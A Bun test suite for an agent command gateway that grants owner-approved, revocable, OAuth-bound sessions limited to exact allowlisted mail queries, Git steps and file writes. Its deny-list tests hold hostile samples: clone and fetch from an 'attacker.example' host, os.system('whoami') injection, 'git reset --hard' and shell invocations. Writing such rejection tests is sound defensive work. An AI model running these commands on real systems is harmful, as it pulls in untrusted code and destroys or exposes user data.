import { describe, test, expect } from "bun:test";
import { readFileSync } from "node:fs";
process.env.RIAN_TEST_MODE="1";
const {validateTrustedMailCommand,newTrustedSession,ownedSession,currentSessionState,trustedSessions,trustedDispatch,approvalRequestSeconds,smokeWriteAllowed,projectWriteAllowed,v2MutablePath,v2WriteAllowed,salCommandAllowed,salWriteAllowed}=await import("./gateway.ts");
const source=readFileSync(new URL("./gateway.ts",import.meta.url),"utf8");
const cwd="Documents/RIAN-Proton-Tools";
const valid=(argv:string[],timeout=30)=>validateTrustedMailCommand({argv,cwd,timeout});
describe("Proton scoped trusted session commands",()=>{
 test("allows status read",()=>expect(valid(["python","proton_mail_query.py","status"]).argv).toEqual(["python","proton_mail_query.py","status"]));
 test("allows exact subject search",()=>expect(valid(["python","proton_mail_query.py","search","전승열"]).cwd).toBe(cwd));
 test("allows bounded --limit only",()=>expect(valid(["python","proton_mail_query.py","search","특허","--limit","20"]).argv[5]).toBe("20"));
 test("rejects full-text body reads",()=>expect(()=>valid(["python","proton_mail_query.py","search","patent","--full-text"])).toThrow());
 test("rejects private/all mail",()=>expect(()=>valid(["python","proton_mail_query.py","search","patent","--all"])).toThrow());
 test("rejects mail body read",()=>expect(()=>valid(["python","proton_mail_query.py","read","proton-abc"])).toThrow());
 test("rejects ingest/sync",()=>expect(()=>valid(["python","proton_ingest.py","--prepare"])).toThrow());
 test("rejects Python code evaluation",()=>expect(()=>valid(["python","-c","print(1)"])).toThrow());
 test("rejects PowerShell/shell",()=>expect(()=>valid(["powershell","-Command","echo hello"])).toThrow());
 test("rejects arbitrary cwd",()=>expect(()=>validateTrustedMailCommand({argv:["python","proton_mail_query.py","status"],cwd:"Documents"})).toThrow());
 test("rejects line breaks",()=>expect(()=>valid(["python","proton_mail_query.py","search","hello\nbad"])).toThrow());
 test("rejects flags in search text",()=>expect(()=>valid(["python","proton_mail_query.py","search","--all"])).toThrow());
 test("rejects oversized limit",()=>expect(()=>valid(["python","proton_mail_query.py","search","foo","--limit","99"])).toThrow());
 test("rejects too many argv",()=>expect(()=>valid(["python","proton_mail_query.py","search","hello","--limit","2","x"])).toThrow());
 test("rejects extra arguments",()=>expect(()=>validateTrustedMailCommand({argv:["python","proton_mail_query.py","status"],cwd,overwrite:true})).toThrow());
 test("rejects excessive timeout",()=>expect(()=>validateTrustedMailCommand({argv:["python","proton_mail_query.py","status"],cwd,timeout:90})).toThrow());
});
describe("trusted session authorization source checks",()=>{
 test("bound to requester OAuth client",()=>{
   expect(source).toContain("s.clientId===clientId");
   expect(source).toContain("session.clientId!==clientId");
   expect(source).toContain("token.client_id");
 });
 test("requires browser password; no agent approve tool",()=>{
   expect(source).toContain('p==="/session/activate"');
   expect(source).toContain('passwordOK(values.get("password")');
   expect(source).toContain('if(originHeader!==origin)');
   expect(source).not.toContain('name:"rian_eemf_approve_trusted_session"');
 });
 test("limits time/calls and supports immediate revocation",()=>{
   expect(source).toContain("TRUSTED_DURATION_SECONDS=1800");
   expect(source).toContain("TRUSTED_MAX_CALLS=60");
   expect(source).toContain('s.state="REVOKED";s.remaining=0');
   expect(source).toContain("s.remaining--");
   expect(source).toContain("if(s.busy)throw Error");
 });
 test("pins exact source and signs one-use relay approval each command",()=>{
   expect(source).toContain('s.sourceHash!==digest');
   expect(source).toContain('relay("rian_eemf_run_command",safe,true)');
   expect(source).toContain('headers["x-rian-eemf-approved"]');
 });
 test("write/ordinary commands still require individual approval",()=>{
   expect(source).toContain('name==="rian_eemf_request_command"');
   expect(source).toContain('name==="rian_eemf_request_write"');
   expect(source).toContain('actionQueue.set(actionId,{operation,args,clientId,status:"PENDING_APPROVAL",issuedAt,exp:issuedAt+ttl}');
 });
});

describe("real trusted session state transitions (no network, no command execution)",()=>{
 test("new session starts pending and is linked to one OAuth client",()=>{
  const result=newTrustedSession("rian.clientA");
  const payload=JSON.parse(result.content[0].text);
  expect(payload.state).toBe("PENDING_APPROVAL");
  expect(payload.maximum_calls).toBe(60);
  expect(payload.duration_after_approval_seconds).toBe(1800);
  const saved=ownedSession(payload.session_id,"rian.clientA");
  expect(saved.state).toBe("PENDING_APPROVAL");
  expect(()=>ownedSession(payload.session_id,"rian.otherClient")).toThrow("Unknown trusted session");
  saved.state="REVOKED";
 });
 test("rejects second active/pending session for the same client",()=>{
  const res=newTrustedSession("rian.clientB"),id=JSON.parse(res.content[0].text).session_id;
  expect(()=>newTrustedSession("rian.clientB")).toThrow("Existing pending or active trusted session");
  trustedSessions.get(id).state="REVOKED";
  expect(JSON.parse(newTrustedSession("rian.clientB").content[0].text).state).toBe("PENDING_APPROVAL");
 });
 test("pending session expires without approval",()=>{
  const res=newTrustedSession("rian.clientC"),id=JSON.parse(res.content[0].text).session_id,s=trustedSessions.get(id);
  expect(currentSessionState(s,s.requestUntil-1)).toBe("PENDING_APPROVAL");
  expect(currentSessionState(s,s.requestUntil)).toBe("EXPIRED");
 });
 test("active session expires at deadline and when quota runs out",()=>{
  const res=newTrustedSession("rian.clientD"),id=JSON.parse(res.content[0].text).session_id,s=trustedSessions.get(id);
  s.state="ACTIVE";s.validUntil=2000;s.remaining=2;
  expect(currentSessionState(s,1999)).toBe("ACTIVE");
  expect(currentSessionState(s,2000)).toBe("EXPIRED");
  const other=newTrustedSession("rian.clientE");
  const d=trustedSessions.get(JSON.parse(other.content[0].text).session_id);
  d.state="ACTIVE";d.validUntil=5000;d.remaining=0;
  expect(currentSessionState(d,3000)).toBe("EXPIRED");
 });
 test("immediate revocation prevents subsequent authorized commands",async()=>{
  const res=newTrustedSession("rian.clientF"),id=JSON.parse(res.content[0].text).session_id,s=trustedSessions.get(id);
  s.state="ACTIVE";s.validUntil=Math.floor(Date.now()/1000)+500;s.remaining=2;
  const revoked=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:id},"rian.clientF")).content[0].text);
  expect(revoked.state).toBe("REVOKED");
  expect(revoked.remaining_calls).toBe(0);
  await expect(trustedDispatch("rian_eemf_run_trusted_command",{session_id:id,argv:["python","proton_mail_query.py","status"],cwd:"Documents/RIAN-Proton-Tools",timeout:30},"rian.clientF")).rejects.toThrow("inactive");
 });
 test("another client cannot read, revoke or invoke the session",async()=>{
  const res=newTrustedSession("rian.clientG"),id=JSON.parse(res.content[0].text).session_id;
  await expect(trustedDispatch("rian_eemf_trusted_session_status",{session_id:id},"rian.other")).rejects.toThrow();
  await expect(trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:id},"rian.other")).rejects.toThrow();
  trustedSessions.get(id).state="REVOKED";
 });
});

describe("chat-native developer environment checks (strict scope only)",()=>{
 const profile="dev-version-checks-v1",dir="Documents";
 const good=(argv:string[],timeout=15)=>validateTrustedMailCommand({argv,cwd:dir,timeout},profile);
 test.each(["python","git","node"])("allows exact %s --version",bin=>{
  expect(good([bin,"--version"]).argv).toEqual([bin,"--version"]);
  expect(good([bin,"--version"]).cwd).toBe(dir);
 });
 test("rejects arbitrary code, shell and state-changing operations",()=>{
  const denied=[
   ["python","-c","print(1)"],["git","checkout","main"],["git","status"],["git","reset","--hard"],
   ["node","-e","console.log(1)"],["powershell","-Command","dir"],["cmd","/c","dir"],
   ["Python","--version"],["python","--version","--extra"],["python","--version\n"]
  ];
  for(const argv of denied)expect(()=>good(argv)).toThrow();
 });
 test("rejects workspace changes and elevated timeouts",()=>{
  expect(()=>validateTrustedMailCommand({argv:["python","--version"],cwd:"Documents/Other",timeout:15},profile)).toThrow();
  expect(()=>validateTrustedMailCommand({argv:["python","--version"],cwd:"Documents",timeout:31},profile)).toThrow();
  expect(()=>validateTrustedMailCommand({argv:["python","--version"],cwd:"Documents",timeout:15,overwrite:true},profile)).toThrow();
 });
 test("mail profiles cannot execute the developer commands",()=>{
  expect(()=>validateTrustedMailCommand({argv:["python","--version"],cwd:dir}, "outlook-local-metadata-v1")).toThrow();
  expect(()=>validateTrustedMailCommand({argv:["python","--version"],cwd:dir}, "proton-local-readonly-v1")).toThrow();
 });
 test("new developer profile is bound to one client and revocable",async()=>{
  const request=newTrustedSession("rian.dev-test-client",profile);
  const info=JSON.parse(request.content[0].text);
  expect(info.profile).toBe(profile);
  expect(info.state).toBe("PENDING_APPROVAL");
  const own=JSON.parse((await trustedDispatch("rian_eemf_trusted_session_status",{session_id:info.session_id},"rian.dev-test-client")).content[0].text);
  expect(own.state).toBe("PENDING_APPROVAL");
  expect(own.workspace).toBe(dir);
  await expect(trustedDispatch("rian_eemf_trusted_session_status",{session_id:info.session_id},"rian.not-owner")).rejects.toThrow();
  const revoked=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:info.session_id},"rian.dev-test-client")).content[0].text);
  expect(revoked.state).toBe("REVOKED");
  await expect(trustedDispatch("rian_eemf_run_trusted_command",{session_id:info.session_id,argv:["python","--version"],cwd:dir,timeout:15},"rian.dev-test-client")).rejects.toThrow("inactive");
 });
 test("existing chat-native command tool reuses only approved profile and owner client",()=>{
  expect(source).toContain("eligibleTrustProfile");
  expect(source).toContain('if(approval_mode!=="each")');
  expect(source).toContain('s.clientId===clientId');
  expect(source).toContain('if(s.sourceHash!==digest)');
  expect(source).toContain('relay("rian_eemf_run_command",safe,true)');
 });
});

describe("approval request TTL hardening (bug: GET 200 then POST 409 7 seconds later)",()=>{
 const cmd=(argv:string[],cwd="Documents",timeout=15)=>approvalRequestSeconds("rian_eemf_run_command",{argv,cwd,timeout});
 test.each(["python","git","node"])("%s version check has thirty minute approval time",bin=>{
  expect(cmd([bin,"--version"])).toBe(1800);
 });
 test("dangerous or out of scope commands keep short 5-minute approval",()=>{
  expect(cmd(["python","-c","print(1)"])).toBe(300);
  expect(cmd(["git","status"])).toBe(300);
  expect(cmd(["powershell","-Command","whoami"])).toBe(300);
  expect(cmd(["python","--version"],"Documents/private")).toBe(300);
  expect(cmd(["python","--version"],"Documents",60)).toBe(300);
 });
 test("writes and mail searches do not inherit extended approvals",()=>{
  expect(approvalRequestSeconds("rian_eemf_write_file",{path:"Documents/test.txt",content:"demo",overwrite:false})).toBe(300);
  expect(approvalRequestSeconds("rian_eemf_run_command",{argv:["python","outlook_bridge.py","doctor"],cwd:"Documents/rian-outlook-bridge",timeout:20})).toBe(300);
 });
 test("source displays expiration and preserves signed browser form and owner approval",()=>{
  expect(source).toContain("const DEV_APPROVAL_SECONDS=1800,DEFAULT_APPROVAL_SECONDS=300,DEV_APPROVAL_FORM_SECONDS=600");
  expect(source).toContain("const ttl=approvalRequestSeconds(operation,args),issuedAt=now()");
  expect(source).toContain("exp:issuedAt+ttl");
  expect(source).toContain("expires_at:issuedAt+ttl");
  expect(source).toContain("승인 요청 만료 시각");
  expect(source).toContain('const proof=ticket({type:"eemf-action-approval"');
  expect(source).toContain('passwordOK(f.get("password")');
 });
});

describe("chat-native isolated developer smoke project — one user-approved scope",()=>{
 const profile="dev-sandbox-smoke-v1",cwd="Documents",root="Documents/RIAN-Commander-Smoke";
 const boot=["python","-I","-S","-c","from pathlib import Path; Path('RIAN-Commander-Smoke').mkdir(exist_ok=True); print('RIAN_SMOKE_READY')"];
 const run=["python","-I","-S","-m","unittest","discover","-s","RIAN-Commander-Smoke","-p","test_calculator.py","-v"];
 const bug="def total_with_tax(subtotal, tax_rate):\n    if subtotal < 0 or tax_rate < 0:\n        raise ValueError('negative inputs')\n    return subtotal - subtotal * tax_rate\n";
 const fixed="def total_with_tax(subtotal, tax_rate):\n    if subtotal < 0 or tax_rate < 0:\n        raise ValueError('negative inputs')\n    return subtotal + (subtotal * tax_rate)\n";
 const tests="import unittest\nfrom calculator import total_with_tax\n\nclass TaxTests(unittest.TestCase):\n    def test_tax_10(self):\n        self.assertEqual(total_with_tax(100, .1), 110)\n    def test_tax_25(self):\n        self.assertEqual(total_with_tax(80, .25), 100)\n    def test_zero(self):\n        self.assertEqual(total_with_tax(100, 0), 100)\n    def test_negative(self):\n        with self.assertRaises(ValueError):\n            total_with_tax(-1, .1)\n";
 test("allow only exact bootstrap and unittest commands",()=>{
  for(const argv of [boot,run]){
   expect(validateTrustedMailCommand({argv,cwd,timeout:25},profile).argv).toEqual(argv);
   expect(approvalRequestSeconds("rian_eemf_run_command",{argv,cwd,timeout:25})).toBe(1800);
  }
 });
 test("deny direct shell, arbitrary python, changed script, altered cwd and other tools",()=>{
  const invalid=[["powershell","-Command","whoami"],["python","-c","print(1)"],
   ["python","-I","-S","-c","import os; os.system('whoami')"],["cmd","/c","dir"],["git","reset","--hard"]];
  for(const argv of invalid)expect(()=>validateTrustedMailCommand({argv,cwd,timeout:25},profile)).toThrow();
  for(const argv of [boot,run]){
   expect(()=>validateTrustedMailCommand({argv,cwd:"Documents/Other",timeout:25},profile)).toThrow();
   expect(()=>validateTrustedMailCommand({argv,cwd,timeout:45},profile)).toThrow();
  }
 });
 test("smoke file writes are exact-content and exact-path only",()=>{
  expect(smokeWriteAllowed({path:root+"/calculator.py",content:bug,overwrite:false})).toBe(true);
  expect(smokeWriteAllowed({path:root+"/calculator.py",content:fixed,overwrite:true})).toBe(true);
  expect(smokeWriteAllowed({path:root+"/test_calculator.py",content:tests,overwrite:false})).toBe(true);
  expect(smokeWriteAllowed({path:root+"/calculator.py",content:fixed,overwrite:false})).toBe(false);
  expect(smokeWriteAllowed({path:root+"/test_calculator.py",content:tests,overwrite:true})).toBe(false);
  expect(smokeWriteAllowed({path:"Documents/real-work.py",content:bug,overwrite:false})).toBe(false);
  expect(smokeWriteAllowed({path:root+"/calculator.py",content:"import os\nos.system('whoami')\n",overwrite:true})).toBe(false);
 });
 test("sandbox profile has per-OAuth-client owned session and can be revoked",async()=>{
  const reply=newTrustedSession("rian.dev-smoke-test",profile);
  const claim=JSON.parse(reply.content[0].text);
  expect(claim.profile).toBe(profile);
  expect(claim.state).toBe("PENDING_APPROVAL");
  expect(()=>ownedSession(claim.session_id,"rian.not-owner")).toThrow();
  expect(ownedSession(claim.session_id,"rian.dev-smoke-test").profile).toBe(profile);
  const revoked=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:claim.session_id},"rian.dev-smoke-test")).content[0].text);
  expect(revoked.state).toBe("REVOKED");
 });
 test("exact-file write path and test runner are source-verified and require existing owner approval",()=>{
  expect(source).toContain("async function smokeScopedWrite");
  expect(source).toContain("s.clientId===clientId");
  expect(source).toContain('smokeWriteAllowed(args)');
  expect(source).toContain('if(s.sourceHash!==await trustedSourceDigest(SMOKE_PROFILE))');
  expect(source).toContain("Sandbox policy changed; approval revoked");
  expect(source).toContain("Overwrite refused: calculator.py differs from known buggy baseline");
  expect(source).toContain("File write verification mismatch");
  expect(source).toContain("await smokeVerifySources()");
  expect(source).toContain('passwordOK(f.get("password")');
  expect(source).toContain('relay("rian_eemf_write_file",args,true)');
 });
});

describe("generic scratch edits with CAS and bounded syntax-only execution",()=>{
 const profile="dev-workspace-edit-v1",cwd="Documents",root="Documents/RIAN-Commander-Smoke";
 const compile=["python","-I","-S","-m","py_compile","RIAN-Commander-Smoke/calculator.py"];
 test("approves only the exact safe syntax compiler",()=>{
  expect(validateTrustedMailCommand({argv:compile,cwd,timeout:20},profile).argv).toEqual(compile);
  expect(approvalRequestSeconds("rian_eemf_run_command",{argv:compile,cwd,timeout:20})).toBe(1800);
 });
 test("rejects arbitrary Python, shell, test execution and altered working folder",()=>{
  const bad=[["python","-c","print(1)"],["python","-m","unittest","discover"],
    ["powershell","-Command","whoami"],["python","-I","-S","-m","py_compile","../private.py"],
    ["cmd","/c","dir"],["python","-I","-S","-m","pip","install","package"]];
  for(const argv of bad)expect(()=>validateTrustedMailCommand({argv,cwd,timeout:20},profile)).toThrow();
  expect(()=>validateTrustedMailCommand({argv:compile,cwd:root,timeout:20},profile)).toThrow();
  expect(()=>validateTrustedMailCommand({argv:compile,cwd,timeout:50},profile)).toThrow();
 });
 test("accepts dynamic content in only two pinned scratch files",()=>{
  const src="def total_with_tax(subtotal, rate):\n    return subtotal * (1 + rate)\n";
  expect(projectWriteAllowed({path:root+"/calculator.py",content:src,overwrite:true})).toBe(true);
  expect(projectWriteAllowed({path:root+"/notes.md",content:"## Patch notes\n",overwrite:false})).toBe(true);
  expect(projectWriteAllowed({path:root+"/notes.md",content:"## Updated notes\n",overwrite:true})).toBe(true);
  for(const path of [root+"/test_calculator.py",root+"/config.json","Documents/other.py",root+"/calculator.py/../notes.md"])
    expect(projectWriteAllowed({path,content:src,overwrite:true})).toBe(false);
  expect(projectWriteAllowed({path:root+"/calculator.py",content:src,overwrite:false})).toBe(false);
  expect(projectWriteAllowed({path:root+"/calculator.py",content:"",overwrite:true})).toBe(false);
  expect(projectWriteAllowed({path:root+"/calculator.py",content:"a".repeat(5001),overwrite:true})).toBe(false);
  expect(projectWriteAllowed({path:root+"/calculator.py",content:src,overwrite:true,run:true})).toBe(false);
 });
 test("per-client owner-approved grant and explicit revoke remain mandatory",async()=>{
  const out=newTrustedSession("rian.workspace.alpha",profile),value=JSON.parse(out.content[0].text);
  expect(value.profile).toBe(profile);
  expect(value.state).toBe("PENDING_APPROVAL");
  expect(value.workspace).toBeUndefined();
  expect(()=>ownedSession(value.session_id,"rian.workspace.beta")).toThrow();
  const status=JSON.parse((await trustedDispatch("rian_eemf_trusted_session_status",{session_id:value.session_id},"rian.workspace.alpha")).content[0].text);
  expect(status.workspace).toBe(root);
  const revoked=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:value.session_id},"rian.workspace.alpha")).content[0].text);
  expect(revoked.state).toBe("REVOKED");
 });
 test("CAS preflight, owner proof and file readback enforced in source",()=>{
  expect(source).toContain("projectTrackRead(clientId,args.path,val.result.content)");
  expect(source).toContain("projectKey(clientId,args.path)");
  expect(source).toContain("snap.until<=now()");
  expect(source).toContain("projectDigest(previous)!==snap.hash");
  expect(source).toContain("CAS conflict: file modified since last read; refresh first");
  expect(source).toContain("Write verification failed");
  expect(source).toContain("grant.remaining--");
  expect(source).toContain('if(!a||a.exp<now()||a.clientId!==clientId)');
  expect(source).toContain('passwordOK(f.get("password")');
  expect(source).toContain('relay("rian_eemf_write_file",{path:args.path,content:args.content,overwrite:args.overwrite},true)');
 });
});

describe("V2 project folder, pinned tests and rollback policies",()=>{
 const profile="dev-project-history-v2",cwd="Documents",root="Documents/RIAN-Commander-Smoke";
 const boot=["python","-I","-S","-c","print('RIAN_PROJECT_V2_READY')"];
 const runner=["python","-I","-S","RIAN-Commander-Smoke/_rian_runner.py"];
 const good=(argv:string[],dir=cwd,timeout=25)=>validateTrustedMailCommand({argv,cwd:dir,timeout},profile);
 test("permits pinned profile bootstrap, pinned test runner and owner-selected duration",()=>{
  for(const cmd of [boot,runner]){
   expect(good(cmd).argv).toEqual(cmd);
   expect(approvalRequestSeconds("rian_eemf_run_command",{argv:cmd,cwd,timeout:25})).toBe(1800);
  }
 });
 test("denies arbitrary shell, raw unittest, Python eval, other cwd and timeout abuse",()=>{
  const bad=[["powershell","-Command","whoami"],["cmd","/c","dir"],["python","-c","print(1)"],
    ["python","-m","unittest","discover"],["python","-I","-S","-m","pytest"],["git","reset","--hard"]];
  for(const cmd of bad)expect(()=>good(cmd)).toThrow();
  expect(()=>good(runner,"Documents/private")).toThrow();
  expect(()=>good(runner,cwd,36)).toThrow();
 });
 test("allowlisted flat .py/.md project files, rejecting tests, helpers and traversal",()=>{
  for(const name of ["calculator.py","notes.md","helper.py","guide.md"]){
   expect(v2MutablePath(root+"/"+name)).toBe(true);
   expect(v2WriteAllowed({path:root+"/"+name,content:"some content\n",overwrite:true})).toBe(true);
  }
  for(const path of [root+"/test_calculator.py",root+"/_rian_runner.py",root+"/nested/evil.py",
      root+"/../secret.py","Documents/elsewhere.py",root+"/.env",root+"/other.json",root+"/a.PY"]){
   expect(v2MutablePath(path)).toBe(false);
  }
 });
 test("test runner and history initialization are exact-content and create-only",()=>{
  const runnerFile=root+"/_rian_runner.py",ledgerFile=root+"/rian_history.json";
  const fixture='{"version":1,"entries":[]}';
  expect(v2WriteAllowed({path:ledgerFile,content:fixture,overwrite:false})).toBe(true);
  expect(v2WriteAllowed({path:ledgerFile,content:fixture,overwrite:true})).toBe(false);
  expect(v2WriteAllowed({path:runnerFile,content:"import os",overwrite:false})).toBe(false);
  expect(v2WriteAllowed({path:root+"/calculator.py",content:"a".repeat(5001),overwrite:true})).toBe(false);
  expect(v2WriteAllowed({path:root+"/notes.md",content:" ",overwrite:false})).toBe(false);
  expect(v2WriteAllowed({path:root+"/notes.md",content:"hello",overwrite:false,delete:true})).toBe(false);
 });
 test("session is tied to OAuth client and can be immediately revoked",async()=>{
  const request=newTrustedSession("rian.v2-test",profile),payload=JSON.parse(request.content[0].text);
  expect(payload.profile).toBe(profile);
  expect(payload.state).toBe("PENDING_APPROVAL");
  expect(()=>ownedSession(payload.session_id,"rian.other")).toThrow();
  const status=JSON.parse((await trustedDispatch("rian_eemf_trusted_session_status",{session_id:payload.session_id},"rian.v2-test")).content[0].text);
  expect(status.workspace).toBe(root);
  const revoked=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:payload.session_id},"rian.v2-test")).content[0].text);
  expect(revoked.state).toBe("REVOKED");
 });
 test("source stores history on the PC before overwrite and guards against stale sources",()=>{
  for(const rule of [
   'const V2_HISTORY=V2_ROOT+"/rian_history.json"',
   'const V2_RUNNER=',
   'async function v2RecoverLedger',
   'snapshot.until<=now()',
   'CAS conflict: file changed after last read',
   'log.state="COMPLETE"',
   'await v2SaveLedger(ledger)',
   'Source write readback differs from requested content',
   'Project policy changed; session revoked',
   'async function v2CheckRunner',
   'Pinned unit test runner or fixture changed',
   'v2MutablePath(path)',
   's.clientId===clientId',
   'passwordOK(f.get("password")',
  ])expect(source).toContain(rule);
  expect(source).toContain('relay("rian_eemf_write_file",{path:args.path,content:args.content,overwrite:args.overwrite},true)');
 });
});

describe("Salpion PR16 Git task scoped trust — one approval for fetch/worktree/test",()=>{
 const profile="dev-salpion-pr16-v1",docs="Documents";
 const root="Documents/RIAN-Salpion-PR16",worktree=root+"/pr16";
 const sha="3db3637ab74a74918ffa09c8d034fc8485fe3cfd";
 const boot=["python","-I","-S","-c","from pathlib import Path;Path('RIAN-Salpion-PR16').mkdir(exist_ok=True);print('RIAN_SALPION_READY')"];
 const supported=[
  {id:"bootstrap",cwd:docs,argv:boot},
  {id:"clone",cwd:root,argv:["git","-c","credential.interactive=never","-c","core.hooksPath=NUL","clone","--no-checkout","--filter=blob:none","https://github.com/youthofdnation/rian-vision-reliability.git","repo"]},
  {id:"fetch",cwd:root,argv:["git","-C","repo","fetch","--no-tags","origin","refs/pull/16/head:refs/remotes/origin/pr-16"]},
  {id:"worktree",cwd:root,argv:["git","-c","core.hooksPath=NUL","-C","repo","worktree","add","--detach","../pr16",sha]},
  {id:"status",cwd:root,argv:["git","-C","pr16","status","--short","--untracked-files=normal"]},
  {id:"head",cwd:root,argv:["git","-C","pr16","rev-parse","HEAD"]},
  {id:"diff",cwd:root,argv:["git","-C","pr16","diff","--","tools/its_small_object_eval.py","rian_pr16_notes.md"]},
  {id:"test",cwd:worktree,argv:["python","-I","-c","import os;os.environ['PYTEST_DISABLE_PLUGIN_AUTOLOAD']='1';import pytest;raise SystemExit(pytest.main(['tests/test_its_small_object_eval.py','-q','-p','no:cacheprovider']))"]}
 ];
 test("admits pinned Git workflow and test without a repeated browser approval",()=>{
  for(const step of supported){
   expect(salCommandAllowed({cwd:step.cwd,argv:step.argv,timeout:25}).argv).toEqual(step.argv);
   expect(approvalRequestSeconds("rian_eemf_run_command",{cwd:step.cwd,argv:step.argv,timeout:25})).toBe(1800);
   expect(validateTrustedMailCommand({cwd:step.cwd,argv:step.argv,timeout:25},profile).argv).toEqual(step.argv);
  }
 });
 test("blocks push, reset, clean, alternate fetch URL, arbitrary Python and shells",()=>{
  const bad=[["git","push","origin","main"],["git","reset","--hard"],["git","clean","-fd"],
    ["git","fetch","https://attacker.example/evil"],["git","-C","repo","worktree","remove","../pr16"],
    ["git","clone","https://attacker.example/evil","repo"],["python","-c","print(1)"],
    ["powershell","-Command","whoami"],["cmd","/c","dir"],["python","-m","pip","install","pytest"]];
  for(const argv of bad)expect(()=>salCommandAllowed({cwd:root,argv,timeout:25})).toThrow();
  expect(approvalRequestSeconds("rian_eemf_run_command",{cwd:root,argv:["git","reset","--hard"],timeout:20})).toBe(300);
 });
 test("rejects other workspace, extra fields and excessive timeout",()=>{
  expect(()=>salCommandAllowed({cwd:"Documents/private",argv:supported[2].argv,timeout:25})).toThrow();
  expect(()=>salCommandAllowed({cwd:worktree,argv:supported[7].argv,timeout:91})).toThrow();
  expect(()=>salCommandAllowed({cwd:docs,argv:boot,timeout:20,recursive:true})).toThrow();
 });
 test("only pinned source overwrite and notes create/edit are allowed",()=>{
  const src=worktree+"/tools/its_small_object_eval.py",note=worktree+"/rian_pr16_notes.md";
  expect(salWriteAllowed({path:src,content:"def f():\n    return 1\n",overwrite:true})).toBe(true);
  expect(salWriteAllowed({path:note,content:"# PR16 observations\n",overwrite:false})).toBe(true);
  expect(salWriteAllowed({path:note,content:"# PR16 updated\n",overwrite:true})).toBe(true);
  const refused=[{path:src,content:"x",overwrite:false},
    {path:worktree+"/tests/test_its_small_object_eval.py",content:"x",overwrite:true},
    {path:worktree+"/../other.py",content:"x",overwrite:true},
    {path:worktree+"/.git/config",content:"x",overwrite:true},
    {path:src,content:"z".repeat(11501),overwrite:true},
    {path:src,content:"",overwrite:true},
    {path:src,content:"x",overwrite:true,force:true}];
  for(const x of refused)expect(salWriteAllowed(x)).toBe(false);
 });
 test("scope is OAuth-client-owned and can be revoked",async()=>{
  const proposed=JSON.parse(newTrustedSession("rian.salpion-test",profile).content[0].text);
  expect(proposed.profile).toBe(profile);
  expect(proposed.state).toBe("PENDING_APPROVAL");
  expect(()=>ownedSession(proposed.session_id,"rian.other")).toThrow();
  const detail=JSON.parse((await trustedDispatch("rian_eemf_trusted_session_status",{session_id:proposed.session_id},"rian.salpion-test")).content[0].text);
  expect(detail.workspace).toBe(worktree);
  const revoke=JSON.parse((await trustedDispatch("rian_eemf_revoke_trusted_session",{session_id:proposed.session_id},"rian.salpion-test")).content[0].text);
  expect(revoke.state).toBe("REVOKED");
 });
 test("live gateway source gates trust on origin, pinned HEAD, tests, CAS and explicit owner password",()=>{
  for(const rule of [
   'const SAL_PROFILE="dev-salpion-pr16-v1"',
   'const SAL_SHA="3db3637ab74a74918ffa09c8d034fc8485fe3cfd"',
   'const SAL_TEST_BLOB="37ec260067e28620e6b0ee19d293991676624ae9"',
   'async function salPreflight(command)',
   'await salExec(["python","-I","-S","-c",SAL_GUARD]',
   'text===expected',
   'if(op.id==="tests")await salExec',
   'SAL_FILE_GUARD','SAL_NOTE_GUARD',
   'PR16 stale-source conflict',
   's.clientId===clientId',
   'passwordOK(f.get("password")',
   'if(s.profile===SAL_PROFILE)await salPreflight(safe)',
   'profile===SAL_PROFILE?',
   'const approvalOptions=profile===SAL_PROFILE?',
   'credential.interactive=never',
   'PYTEST_DISABLE_PLUGIN_AUTOLOAD',
  ])expect(source).toContain(rule);
 });
});
